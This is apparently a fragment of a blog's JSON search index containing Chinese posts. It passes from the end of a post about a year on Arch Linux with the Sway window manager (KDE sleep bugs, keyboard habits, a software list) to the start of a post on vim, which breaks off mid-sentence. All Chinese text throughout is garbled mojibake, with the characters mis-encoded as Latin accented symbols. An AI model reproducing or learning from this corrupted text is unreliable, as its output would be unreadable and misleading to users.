æ¬¡åœ¨æ›´æ–°çš„æ—¶å€™å‘ç”Ÿäº†Manjaroç‰¹æœ‰çš„é—®é¢˜ï¼šè½¯ä»¶çš„ç‰ˆæœ¬æ›´æ–°ä¸Šæ¥äº†ï¼Œä½†æ˜¯è½¯ä»¶çš„ä¾èµ–æ²¡æœ‰æ›´æ–°ä¸Šæ¥ï¼Œè¿™ç§é—®é¢˜ä¹Ÿå½±å“äº†triliumç­‰è½¯ä»¶ï¼Œè™½ç„¶ä¸èƒ½æ€ªmanjaroï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ„¤è€Œè½¬å‘äº†Arch Linuxï¼Œä¸€ç›´åˆ°ä»Šå¤©æˆ‘ä¹Ÿè¿˜åœ¨ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eè½¬åˆ°Arch Linuxä¹‹åï¼Œæˆ‘åŸºæœ¬ä¸Šä¸å†æ”¹å˜è‡ªå·±çš„å‘è¡Œç‰ˆäº†ï¼Œåªæ˜¯ä¼šåœ¨å›¾å½¢ç•Œé¢æŠ˜è…¾ä¸€äº›ã€‚2020å¹´-2021å¹´ä¸ŠåŠå¹´æˆ‘ä½¿ç”¨çš„éƒ½æ˜¯KDEï¼Œå¥½çœ‹æ˜¯çœŸå¥½çœ‹ï¼Œä½†æ˜¯Bugä¹Ÿæ˜¯çœŸçš„è‡´å‘½ï¼Œè¿™å…¶ä¸­æˆ‘äº²èº«ç»å†è¿‡çš„è‡³å°‘ä¸‰æ¬¡é‡å¤å‡ºç°åœ¨ä¸åŒç”µè„‘ï¼ˆthinkpad T480å‡ºç°è¿‡ï¼Œthinkbook 14p å‡ºç°è¿‡ï¼‰çš„bugå°±æ˜¯ç›’ç›–ç¡çœ å¤±è´¥ï¼Œæˆ‘ä¸çŸ¥é“æ˜¯è°å¼•èµ·çš„ï¼Œæ˜¯plasmaè¿˜æ˜¯conkyè¿˜æ˜¯åˆ«çš„ä»€ä¹ˆç»„ä»¶ï¼Œæˆ‘ä¸çŸ¥é“ï¼Œæˆ‘åœ¨æ—¥å¿—é‡Œä¹ŸæŸ¥ä¸åˆ°ã€‚åˆ«çœ‹è¿™ä¸ªé—®é¢˜å¥½åƒæ²¡ä»€ä¹ˆï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªç¬”è®°æœ¬ç”¨æˆ·ï¼Œç›’ç›–åæ”¾è¿›åŒ…é‡Œæ˜¯ä¸€ä¸ªéå¸¸è‡ªç„¶çš„è¡Œä¸ºï¼Œå›åˆ°å®¿èˆæ²¡æœ‰ç¬¬ä¸€æ—¶é—´æ‹¿å‡ºç”µè„‘è€Œæ˜¯ä¼‘æ¯ä¸€ä¼šä¹Ÿæ˜¯å¾ˆæ­£å¸¸çš„è¡Œä¸ºï¼Œä½†æ˜¯ä¼‘æ¯å®Œåå‘ç°è‡ªå·±çš„ç”µè„‘åœ¨åŒ…é‡Œå˜æˆäº†ä¸€ä¸ªé“æ¿çƒ§å°±ä¸æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç°è±¡äº†ã€‚å˜´ç¡¬çš„äººå½“ç„¶ä¼šè¯´thinkpadä¸æ˜¯æœ‰æŒ‡ç¤ºç¯å—ï¼Ÿä½ çœ‹æŒ‡ç¤ºç¯åˆ¤æ–­æ˜¯å¦ç¡çœ æˆåŠŸä¸å°±è¡Œäº†ï¼Ÿä¸”ä¸è¯´æˆ‘åæ¥çš„ç”µè„‘thinkbook 14pæ˜¯æ²¡æœ‰æŒ‡ç¤ºç¯çš„ï¼Œå•å°±ç³»ç»Ÿè´¨é‡è€Œè¨€ï¼Œä¸€ä¸ªç³»ç»Ÿæ¯æ¬¡ä½¿ç”¨çš„æ—¶å€™éƒ½éœ€è¦ç”¨æˆ·å°å¿ƒç¿¼ç¿¼ç›¯ç€æŒ‡ç¤ºç¯çœ‹ï¼Œæ˜¯å¦å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªç³Ÿç³•çš„ç³»ç»Ÿäº†ï¼Ÿä¸ºä»€ä¹ˆæ¢æˆthinkbookï¼Ÿå°±æ˜¯å› ä¸ºè¿™ä¸ªbugæŠŠæˆ‘çš„thinkpadçš„ä¸»æ¿çƒ§åäº†ï¼æˆ‘æ›¾ä»¥ä¸ºè¿™æ˜¯thinkpadç‹¬æœ‰çš„é—®é¢˜ï¼Œå¯æ˜¯å½“thinkbookä¹Ÿå‘ç”ŸåŒæ ·é—®é¢˜çš„æ—¶å€™æˆ‘å¯¹KDEå½»åº•å¤±æœ›äº†ï¼Œæ˜¯çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆæ¼‚äº®çš„æ¡Œé¢ç¯å¢ƒï¼Œå®šåˆ¶æ€§å¼ºåˆæœ‰å¾ˆå¤šç‰¹æ•ˆï¼Œå¯æ˜¯è¿™ä¸€åˆ‡éƒ½å»ºç«‹åœ¨ä¸€äº›ä¸ç¨³å®šçš„bugä¸Šçš„æ—¶å€™ï¼Œè¿™äº›ç‰¹æ•ˆä¼šæ›´å¤šæ‰®æ¼”èµ·bugçš„å¯¼ç«ç´¢è§’è‰²ã€‚\u003c/p\u003e\n\u003cp\u003eç»å†è¿‡KDEçš„bugåï¼Œæˆ‘å¯¹å¤æ‚çš„æ¡Œé¢ç¯å¢ƒäº§ç”Ÿäº†ææƒ§ï¼Œä»–ä»¬å°±åƒæ˜¯ä¸€æšä¸å®šæ—¶ç‚¸å¼¹ã€‚åœ¨è¿™ä¸ªå‰æèƒŒæ™¯ä¸‹ï¼Œæˆ‘æ¥è§¦å¹¶å¼€å§‹ä½¿ç”¨SwayWMï¼Œä¸€ç›´åˆ°ä»Šå¤©ï¼Œæˆ‘ä¹Ÿè¿˜åœ¨ä½¿ç”¨ï¼Œè€Œé‚£ä¸ªè‡´å‘½Bugï¼Œå·²ç»ç¦»æˆ‘è¿œå»ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä½“éªŒ\"\u003eä½“éªŒ\u003c/h2\u003e\n\u003cp\u003eå¾—ç›ŠäºArch Linuxåºå¤§çš„ç”¨æˆ·ç¾¤ï¼ŒArch çš„è½¯ä»¶åŒ…ç”Ÿæ€åœ¨ä¸€ä¼—å‘è¡Œç‰ˆä¸­å¯ä»¥è¯´æ˜¯ç§°ç‹ç§°éœ¸äº†ï¼Œæˆ‘ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œä½ èƒ½æƒ³è±¡åœ¨Linuxçš„è½¯ä»¶ä»“åº“ä¸­ä¼šå‡ºç°deepin-wineé­”æ”¹åçš„è…¾è®¯ç³»è½¯ä»¶å—ï¼Ÿ\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20221217115944914.png\" alt=\"image-20221217115944914\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eæ¯æ¬¡çœ‹åˆ°å…¶ä»–å‘è¡Œç‰ˆç”¨æˆ·æ‰‹åŠ¨ä¸‹è½½debç„¶åå®‰è£…çš„æ—¶å€™ï¼Œæˆ‘éƒ½ä¼šäº§ç”Ÿä¸€ç§ä»–ä»¬æ˜¯ä¸æ˜¯åœ¨ç”¨windowsçš„é”™è§‰ï¼Œå¹¶ä¸æ˜¯çœ‹ä¸èµ·åˆ«çš„å‘è¡Œç‰ˆï¼Œåªæ˜¯å„æœ‰åˆ†å·¥å’Œä¾§é‡ç‚¹ï¼Œæ¯”å¦‚Archçš„å®šä½æ˜¯æ¡Œé¢ç«¯ç”¨æˆ·ï¼Œè€Œå¾ˆå¤šåˆ«çš„å‘è¡Œç‰ˆçš„å®šä½æ˜¯æœåŠ¡å™¨ï¼Œæˆ‘ä¸ä¼šç”¨åˆ«çš„å‘è¡Œç‰ˆå½“ä½œæˆ‘çš„æ¡Œé¢ç³»ç»Ÿï¼Œå°±åƒæˆ‘ä¸ä¼šæŠŠArchè£…åœ¨æœåŠ¡å™¨ä¸Šä¸€æ ·ã€‚ç”¨ç»Ÿä¸€çš„åŒ…ç®¡ç†å™¨ç®¡ç†è½¯ä»¶åŒ…è‚¯å®šæ˜¯æœ‰å¥½å¤„çš„ï¼Œèƒ½å¤Ÿå¤§å¤§å‡è½»ç”¨æˆ·çš„å¿ƒæ™ºè´Ÿæ‹…ã€‚\u003c/p\u003e\n\u003cp\u003eè‡³äºç½‘ç»œä¸Šæåˆ°çš„Arch Linuxä¸ç¨³å®šã€å®¹æ˜“æ»šæŒ‚çš„é—®é¢˜ï¼Œä¸å¥½æ„æ€ï¼Œæˆ‘ç”¨äº†ä¸¤å¹´Archäº†ï¼Œæ¯å¤©éƒ½æ‰§è¡Œ\u003ccode\u003eyay -Syyu\u003c/code\u003eï¼Œä»æ¥æ²¡æœ‰å‡ºç°æ»šæŒ‚çš„é—®é¢˜ï¼Œç›¸åï¼Œæˆ‘ç›®å‰æ‰€é‡åˆ°çš„åŠæ•°Linuxç›¸å…³é—®é¢˜ï¼Œéƒ½æ˜¯å› ä¸ºç³»ç»Ÿè½¯ä»¶æˆ–è€…ä¾èµ–åº“è¿‡äºè€æ—§è€Œå¯¼è‡´çš„ï¼Œæ›´æ–°åå°±å¯ä»¥è§£å†³ã€‚Linuxä¸æ˜¯Windowsï¼Œå¦‚æœä½ ä¸æƒ³è¦æ›´æ–°ï¼Œé‚£ä¹ˆæœ‰ä¸¤ç§é€‰æ‹©ï¼Œç¬¬ä¸€ç§ï¼Œé”å®šè‡ªå·±çš„è½¯ä»¶ç‰ˆæœ¬ï¼Œç„¶ååœ¨æ¯æ¬¡å®‰è£…æ–°è½¯ä»¶çš„æ—¶å€™å•ç‹¬è§£å†³ä¾èµ–é—®é¢˜ï¼›ç¬¬äºŒç§ï¼Œå›å»ç”¨windowsã€‚\u003c/p\u003e\n\u003cp\u003eè¯´å®Œäº†Arch Linuxï¼Œå†æ¥è¯´è¯´Swayï¼Œè¿™æ˜¯ä¸€ä¸ªç®€å•çš„waylandçª—å£ç®¡ç†å™¨ï¼Œä¸ºä»€ä¹ˆç”¨waylandï¼Œå› ä¸ºæˆ‘ä¸å¸Œæœ›è‡ªå·±çš„å›¾å½¢ç•Œé¢å»ºç«‹åœ¨ä¸€ä¸ªè€æ—§è€Œéš¾ä»¥ç»´æŠ¤çš„åŸºç¡€è®¾æ–½ä¹‹ä¸Šï¼Œé‚£ç»™æˆ‘çš„æ„Ÿè§‰å°±å¥½åƒæˆ‘åœ¨ä½¿ç”¨å¦ä¸€ä¸ªplasmaã€‚è¯šç„¶ï¼Œwaylandè¿˜æœ‰å¾ˆé•¿çš„ä¸€æ®µè·¯è¦èµ°ï¼Œå¾ˆå¤šæ¡Œé¢è½¯ä»¶éƒ½ä¸å¾—ä¸å€ŸåŠ©xwaylandæ‰èƒ½åœ¨å…¶ä¸Šè¿è¡Œï¼Œç»è¿‡å®é™…ä½¿ç”¨ï¼Œé™¤äº†åœ¨4kå±å¹•ä¸Šxwaylandæœ‰é—®é¢˜ä¹‹å¤–ï¼Œå…¶ä»–æƒ…å†µä¸‹è¿˜æ˜¯å¯ä»¥å®Œç¾å·¥ä½œçš„ã€‚å½“ç„¶ï¼Œéƒ¨åˆ†è½¯ä»¶æ˜¯æœ‰é—®é¢˜çš„ï¼Œæ¯”å¦‚è…¾è®¯ä¼šè®®çš„æ¡Œé¢å…±äº«åŠŸèƒ½ï¼Œä½†æ˜¯ä¹Ÿå·²ç»æœ‰äº†æ›²çº¿æ•‘å›½çš„åŠæ³•ï¼Œæ‰€ä»¥ç°åœ¨waylandçš„ç”Ÿæ€å·²ç»æ¯”ä¹‹å‰è¦å¥½ä¸€äº›äº†ï¼Œå½“æˆ‘çœ‹åˆ°linux qqå†…æµ‹ç¾¤é‡Œæœ‰äººæå‡ºwaylandä¸‹çš„é—®é¢˜ä»¥åŠè¦æ±‚å…¼å®¹waylandçš„æ—¶å€™ï¼Œæˆ‘å°±ç›¸ä¿¡æœªæ¥è¿˜ä¼šæ›´å¥½ã€‚\u003c/p\u003e\n\u003cp\u003eSwayæ˜¯ä¸€ä¸ªçª—å£ç®¡ç†å™¨ï¼Œå¼€å‘è€…åšçš„äº‹æƒ…æ˜¯åœ¨waylandä¸‹å¤åˆ»ä¸€ä¸ªi3wmå‡ºæ¥ã€‚çª—å£ç®¡ç†å™¨çš„å¥½å¤„æ˜¯æˆ‘ç°åœ¨æ›´å¤šä¾èµ–é”®ç›˜è€Œä¸æ˜¯é¼ æ ‡äº†ï¼Œå¯ä»¥å‡å°‘å¯¹è§†è§‰èšç„¦äºé¼ æ ‡è¿™ç§è¡Œä¸ºçš„ä¾èµ–ï¼Œè½¬è€Œæ›´å¤šä¾èµ–è‡ªå·±çš„è§¦è§‰ï¼Œå¦å¤–ï¼Œæ›´å°‘çš„ç‰¹æ•ˆå’Œæ›´ç®€æ´çš„è®¾è®¡ä¸ä»…è®©æˆ‘çš„ç³»ç»Ÿå¤§å¤§å¢å¼ºäº†ç¨³å®šæ€§ï¼ˆæ®ä¸€ä½ç”¨KDEçš„åŒå­¦è¯´ï¼Œç›´åˆ°ä»Šå¤©ï¼Œç”¨KDEåªè¦ä¸€å‘¨ä¸å…³æœºå°±å¿…å®šä¼šå´©æºƒï¼‰ï¼Œè¿˜è®©æˆ‘è‡ªå·±æ›´åŠ ä¸“æ³¨äºæ‰‹å¤´çš„å·¥ä½œï¼ˆå¹³é“ºå¼çª—å£ç®¡ç†å™¨çš„ç»Ÿä¸€å¥½å¤„ï¼‰ã€‚ä¸å¥½çš„åœ°æ–¹å½“ç„¶ä¹Ÿæœ‰ä¸å°‘ï¼Œæ¯”å¦‚åˆæ¬¡æ¥è§¦çš„æ—¶å€™è¦èŠ±å¾ˆå¤šæ—¶é—´å»é…ç½®å’Œé€‚åº”ï¼Œæ¯”å¦‚æ¯æ¬¡ä¿®æ”¹æ“ä½œé”®ä½çš„æ—¶å€™éƒ½éœ€è¦ä¸€å®šæ—¶é—´å»é‡æ–°é€‚åº”ï¼Œæ¯”å¦‚fcitx5åœ¨æŸäº›è½¯ä»¶ä¸‹é¢æ— æ³•å·¥ä½œæˆ–è€…æ˜¯æœ‰ç¼ºé™·ï¼ˆè¿™ä¸æ˜¯fcitx5çš„é”…ï¼‰ï¼Œæ¯”å¦‚å®ƒè®©æˆ‘è®¤è¯†åˆ°è‡ªå·±æ˜¯ä¸€ä¸ªå¾ˆç¬¨è›‹çš„äººï¼Œä½¿ç”¨äº†ä¸€å¹´äº†ï¼Œè®©æˆ‘æ—¶ä¸æ—¶å°±å‘ç°è‡ªå·±çš„æ“ä½œä¹ æƒ¯å¯ä»¥æœ‰ä¼˜åŒ–ç©ºé—´ï¼Œæ¯”å¦‚ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eåœ¨æŒ‰win+æ•°å­—é”®çš„æ—¶å€™ï¼Œç”¨å¤§æ‹‡æŒ‡å»æŒ‰æ˜¯å¾ˆæ‰­æ›²çš„å§¿åŠ¿ï¼Œ**ä¸€ä¸ªæ›´åŠ è‡ªç„¶çš„å§¿åŠ¿æ˜¯ç”¨å·¦æ‰‹çš„æŒå¿ƒå·¦ä¸‹ï¼ˆæ‰‹èƒŒè§†è§’ï¼‰çš„éƒ¨åˆ†å»å‹winé”®ï¼Œç„¶åç”¨æ‰‹æŒ‡å»æŒ‰æ•°å­—é”®ã€‚**å¦‚æœè¦æŒ‰ctrl+winï¼Œå°±ç”¨åŒæ ·çš„éƒ¨ä½å‹ä½ä¸¤ä¸ªé”®ï¼Œè¿™ä¸ªéš¾åº¦ä¼šå¤§ä¸€äº›ï¼Œå¤§æ¦‚ç¡®å®è¿˜å¯ä»¥ä¼˜åŒ–çš„ã€‚\u003c/li\u003e\n\u003cli\u003eè°ƒæ•´çª—å£å¤§å°çš„æ—¶å€™ï¼Œè¿›å…¥resizeæ¨¡å¼ç„¶åç”¨é”®ç›˜å»æŒ‰æ˜¯å¾ˆä½æ•ˆçš„è¡Œä¸ºï¼Œç›¸åï¼Œè¿™ç§æ—¶å€™ä¾èµ–é¼ æ ‡ä¸æ˜¯ä»€ä¹ˆåäº‹ï¼Œé€šè¿‡æŠŠé¼ æ ‡æ‚¬åœåœ¨çª—å£ä¸Šç„¶åæŒ‰ä½å³é”®è¿›è¡Œæ‹–æ‹½å°±å¯ä»¥å®ç°å¿«é€Ÿçš„çª—å£å¤§å°è°ƒæ•´ã€‚\u003c/li\u003e\n\u003cli\u003escratchpadä¸­æ›´é€‚åˆä½¿ç”¨tabæ¨¡å¼ã€‚\u003c/li\u003e\n\u003cli\u003eæœ‰çš„æ—¶å€™åœ¨ä¸¤ä¸ªworkspaceä¹‹é—´åˆ‡æ¢ä¼šå¾ˆé¢‘ç¹ï¼Œè¿™ä¸ªæ—¶å€™æ›´é€‚åˆç”¨\u003ccode\u003eworkspace back_and_forth\u003c/code\u003eè€Œä¸æ˜¯ä¸€ç›´æ‰§ç€äºç”¨æ•°å­—é”®å»åˆ‡æ¢ï¼Œæˆ–è€…ä½¿ç”¨é¼ æ ‡çš„æ»šè½®æ¥åˆ‡æ¢ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™çš„ä¸»æ„ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªå°çš„ä¼˜ç‚¹ï¼Œåœ¨swayä¸‹å¯ä»¥ç»™ä¸åŒé”®ç›˜æ¢ä¸Šä¸åŒçš„å¸ƒå±€ï¼Œè¿™ç‚¹å¯¹æˆ‘è€Œè¨€æ˜¯åˆšéœ€ï¼Œä½†æ˜¯åœ¨xorgä¸‹é¢ï¼Œè¿™ç§æ“ä½œå¾€å¾€åªèƒ½å°†åŒä¸€ä¸ªå¸ƒå±€åº”ç”¨äºæ‰€æœ‰çš„é”®ç›˜ï¼Œä¸€æ—¦å¸ƒå±€å‡ºç°äº†é—®é¢˜å¯¼è‡´é”®ç›˜ä¸å¯ç”¨ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„é”®ç›˜éƒ½ä¼šå˜å¾—ä¸å¯ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€åï¼Œæˆ‘å’Œå¤§éƒ¨åˆ†çš„geekç”¨æˆ·ä¸ä¸€æ ·ï¼Œæˆ‘æ¯”è¾ƒç¬¨ï¼Œåªæ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œæˆ‘åšä¸åˆ°ä¹Ÿä¸æƒ³å»å’Œä»–ä»¬ä¸€æ ·è§†é¼ æ ‡å¦‚æ´ªæ°´çŒ›å…½ï¼Œç›¸åï¼Œswayä¸‹æˆ‘è¿˜æ˜¯ä¼šé¢‘ç¹ä½¿ç”¨é¼ æ ‡ï¼Œå¯¹æˆ‘æ¥è¯´ç”¨é¼ æ ‡å»äº¤äº’ä¸¤ä¸ªçª—å£çš„ä½ç½®ä¾æ—§æ˜¯æ¯”ç”¨é”®ç›˜æ›´åŠ é«˜æ•ˆçš„æ“ä½œã€‚\u003cstrong\u003eæ‰€ä»¥æˆ‘æƒ³è¯´çš„æ˜¯ï¼Œè¿½æ±‚å±äºè‡ªå·±çš„å®ç”¨æ€§ï¼Œä½ å¯ä»¥å»å‚è€ƒåˆ«äººçš„å»ºè®®ï¼Œä½†æ˜¯æœ€ç»ˆè¿˜æ˜¯è¦æ‰¾åˆ°å±äºä½ è‡ªå·±çš„ä¹ æƒ¯ã€‚\u003c/strong\u003e å¯¹äºæˆ‘ä¸ªäººæ¥è¯´ï¼Œ æˆ‘ä¹Ÿå®Œå…¨ä¸æ’é™¤åœ¨plasmaçš„bugä¿®å¤åå›åˆ°plasmaçš„å¯èƒ½æ€§ï¼Œæ¯•ç«Ÿè€ç‰Œæ¡Œé¢ã€‚\u003c/p\u003e\n\u003cp\u003eåˆ—å‡ºæˆ‘ä½¿ç”¨çš„è½¯ä»¶ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eæ¡Œé¢ç¯å¢ƒ\n\u003cul\u003e\n\u003cli\u003eSwayWMï¼ˆçª—å£ç®¡ç†ï¼‰\u003c/li\u003e\n\u003cli\u003ewaybarï¼ˆä¿¡æ¯å±•ç¤ºæ ï¼‰\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eç»ˆç«¯\n\u003cul\u003e\n\u003cli\u003ealacritty\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eæµè§ˆå™¨\n\u003cul\u003e\n\u003cli\u003efirefox-developer-edition ï¼ˆä¸»åŠ›ï¼‰\u003c/li\u003e\n\u003cli\u003echrome\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eè¾“å…¥æ³•\n\u003cul\u003e\n\u003cli\u003efcitx5\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eä»£ç ç¼–è¾‘\n\u003cul\u003e\n\u003cli\u003eNeovimï¼ˆä¸»åŠ›ï¼‰\u003c/li\u003e\n\u003cli\u003eVscodeï¼ˆå‰¯æ‰‹ï¼‰\u003c/li\u003e\n\u003cli\u003eJetbrains\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eåšç¬”è®°\n\u003cul\u003e\n\u003cli\u003eNeovim-qt\u003c/li\u003e\n\u003cli\u003ezotero\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eæ–‡ä»¶æµè§ˆå™¨\n\u003cul\u003e\n\u003cli\u003eranger\u003c/li\u003e\n\u003cli\u003edolphin\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eçœ‹è®ºæ–‡\n\u003cul\u003e\n\u003cli\u003ezotero\u003c/li\u003e\n\u003cli\u003eokular\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eæ¸¸æˆ\n\u003cul\u003e\n\u003cli\u003esteamï¼ˆæ³°æ‹‰ç‘äºšã€é»‘æš—ä¹‹é­‚â€¦â€¦ï¼‰\u003c/li\u003e\n\u003cli\u003ewaydroidï¼ˆæ˜æ—¥æ–¹èˆŸï¼‰\u003c/li\u003e\n\u003cli\u003eHMCLï¼ˆminecraftï¼‰\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eå·¥å…·æ›¿ä»£\n\u003cul\u003e\n\u003cli\u003eexa æ›¿ä»£ ls\u003c/li\u003e\n\u003cli\u003ezoxide æ›¿ä»£ cd\u003c/li\u003e\n\u003cli\u003escp æ›¿ä»£ cp\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"trouble-shooting\"\u003eTrouble Shooting\u003c/h2\u003e\n\u003ch3 id=\"å…³æœºçš„æ—¶å€™å‡ºç°-a-stoping-job-is-running-for-xxx-hangout\"\u003eå…³æœºçš„æ—¶å€™å‡ºç° a stoping job is running for xxx hangout\u003c/h3\u003e\n\u003cp\u003eä¿®æ”¹\u003ccode\u003e/etc/systemd/system.conf\u003c/code\u003e\u003c/p\u003e","title":"ä½¿ç”¨Arch Linux + Swayä¸€å¹´å"},{"content":" åœ¨æ¶ˆç£¨ä¸‰å¹´æ—¶å…‰ä¹‹åï¼Œæˆ‘ç»ˆäºæ˜ç™½è¿™ä¸ªç¼–è¾‘å™¨è¿˜è¿œè¿œç§°ä¸ä¸Šç¨³å®šï¼Œåœ¨é“è·¯çš„å°½å¤´ä¹‹å‰ï¼Œæˆ‘èƒ½åšçš„å…¶å®åªæœ‰è§‚æœ›ã€‚\nè®°å¾—ä¹‹å‰çœ‹åˆ°è¿‡ä¸€ä¸ªä¾‹å­, å‘åŠ¨æœºèƒ½å¤ŸæˆåŠŸçš„å…³é”®åœ¨äºå®ƒæˆåŠŸå°†\u0026quot;è¿åŠ¨\u0026quot;è¿™ä¸€å¤æ‚çš„è¡Œä¸ºé›†åˆæŠ½è±¡æˆäº†æ—‹è½¬è¿åŠ¨, ä¸€åˆ‡è¿åŠ¨çš†æ—‹è½¬, æ‰€ä»¥å‘åŠ¨æœºåªéœ€è¦åšå¥½æ—‹è½¬å°±å¯ä»¥äº†, ç”¨æˆ·å¯ä»¥è¸©æ²¹é—¨, å¯ä»¥æ‹§æŠŠæ‰‹, å¯ä»¥åšå‡ºå„ç§å„æ ·ä¸åŒçš„æ“ä½œè¡Œä¸º, ä½†æ˜¯è¿™äº›è¡Œä¸ºå…·ä½“ä½œç”¨åˆ°å‘åŠ¨æœºçš„æ—¶å€™, å°±ç»Ÿç»Ÿå˜æˆäº†æ—‹è½¬å¤šå¿«, å¾€å“ªé‡Œæ—‹è½¬. ç”±äºå‘åŠ¨æœºå¯¹è¿åŠ¨é›†åˆè¿›è¡Œäº†é«˜åº¦çš„æŠ½è±¡, å› æ­¤ä½¿å¾—å…¶åŸç†å˜å¾—ç®€å•è€Œæ˜“äºè¿ç§», è¿›è€Œè®©å‘åŠ¨æœºçš„æŠ½è±¡æˆä¸ºäº†åŠ¨åŠ›æœºå™¨çš„äº‹å®æ„ä¹‰ä¸Šçš„æ ‡å‡†. ä»ä¸€ä¸ªç†ç§‘ç”Ÿçš„è§†è§’æ¥çœ‹, è¿™æ˜¯ä¸€ä¸ªæµªæ¼«ä¸”å®ç”¨çš„è®¾è®¡.\nå†æ¥çœ‹å¦ä¸€ä¸ªæç«¯çš„æ¡ˆä¾‹, å‡è®¾æœ‰è¿™ä¹ˆä¸€å°æœºå™¨, å®ƒå¹¶ä¸åƒå‘åŠ¨æœºé‚£æ ·å¯¹è¿åŠ¨é›†åˆè¿›è¡ŒæŠ½è±¡, å®ƒå°†æ‰€æœ‰çš„è¿åŠ¨æ–¹å¼éƒ½ä¿å­˜åœ¨ä¸€å¼ HashMapä¸­, ä½†æ˜¯å®ƒæä¾›äº†ä¸€ä¸ªè½®ç›˜, ç”¨æˆ·åªéœ€è¦å°†è½®ç›˜è½¬åŠ¨åˆ°åˆé€‚çš„ä½ç½®, å°±å¯ä»¥ä»HashMapä¸­æ‰¾åˆ°ç”¨æˆ·æ‰€æœŸæœ›æ‰§è¡Œçš„è¿åŠ¨æ–¹å¼. è¿™æ˜¯ä¸€ä¸ªå¾ˆæ€ªçš„æ¡ˆä¾‹, å› ä¸ºå®ƒæ‰€åšçš„æ­£å¥½ä¸å‘åŠ¨æœºæ‰€åšçš„äº‹æƒ…ç›¸å, å®ƒå¹¶ä¸å¯¹åŠ¨åŠ›æœºå™¨çš„è¡Œä¸ºåšå‡ºæŠ½è±¡, è€Œæ˜¯å¯¹ç”¨æˆ·çš„è¡Œä¸ºè¿›è¡ŒæŠ½çº¿, å°†ç”¨æˆ·æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œéƒ½æŠ½è±¡ä¸ºæ—‹è½¬. å½“ç„¶, è¿™æ ·çš„æœºå™¨å°±ç®—è¢«å‘æ˜å‡ºæ¥, ä¹Ÿæ—©å°±è¢«å½»åº•æŠ›å¼ƒäº†, ä½†æ˜¯ç±»ä¼¼çš„, ä¸é‚£ä¹ˆæç«¯çš„è®¾è®¡, ä¾æ—§å­˜åœ¨, æ¯”å¦‚è¿™ç¯‡æ–‡ç« è¦è¯´çš„vim.\nvimæ‰€æå€¡çš„å…¨é”®ç›˜æ“ä½œç¡®å®è®©äººçœ¼å‰ä¸€æ–°ï¼Œå…¶åŸºæœ¬çš„æ“ä½œé€»è¾‘æ˜¯å°†ç”¨æˆ·çš„è¡Œä¸ºæŠ½è±¡ä¸ºå››ä¸ªæ¨¡å¼ï¼ˆNormal Insert Visual Commandï¼‰ï¼Œä¹‹åçš„æ‰€æœ‰æ’ä»¶ï¼Œä¸ç®¡æ˜¯è¯­æ³•è¡¥å…¨è¿˜æ˜¯å…¶ä»–ï¼Œéƒ½æ˜¯åœ¨è¿™ä¸ªæ“ä½œé€»è¾‘ä¸Šè¿›è¡Œçš„è¡¥å……ã€‚ä¸å¾—ä¸è¯´ï¼Œå¦‚æœä¹ æƒ¯äº†è¿™æ ·çš„æ“ä½œé€»è¾‘ï¼Œä½¿ç”¨èµ·æ¥ç¡®å®æ˜¯æ¯”è¾ƒèˆ’é€‚çš„ï¼Œåªè¦ä½ ä¸é‡åˆ°ä¸€äº›é—®é¢˜\nå¿˜è®°äº†é”®ä½ ä½œä¸ºä¸€ä¸ªè‡ªå®šä¹‰ç¨‹åº¦æé«˜çš„ç¼–è¾‘å™¨ï¼Œè‡ªå®šä¹‰é”®ä½æ˜¯ä¸å¯é¿å…çš„äº‹æƒ…ï¼Œå¹¶ä¸”ç”±äºvimç¼ºä¹æœ‰æ•ˆçš„é¼ æ ‡æ“ä½œï¼Œæ‰€ä»¥éœ€è¦å®šä¹‰é”®ä½æ•°é‡å’Œæ™®é€šçš„IDEç›¸æ¯”ä¼šå¤šå¾—å¤šã€‚ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨IDEä¸‹ç”¨æ‹¬å·å»åŒ…è£¹ä¸€ä¸ªè¯ï¼Œéœ€è¦ç”¨é¼ æ ‡é€‰ä¸­é‚£ä¸ªå­—ç¬¦ä¸²ç„¶åæŒ‰ä¸‹æ‹¬å·å°±å¯ä»¥äº†ï¼Œä½†æ˜¯åœ¨neovimä¸­ï¼Œéœ€è¦ä½¿ç”¨æ’ä»¶surround.nvimï¼Œä½¿ç”¨ysiw(ä¸ºå®ƒæ·»åŠ ï¼Œä¸”ä¸è¯´è¿™ä¸ªæ“ä½œè¡Œä¸ºéœ€è¦ä½ 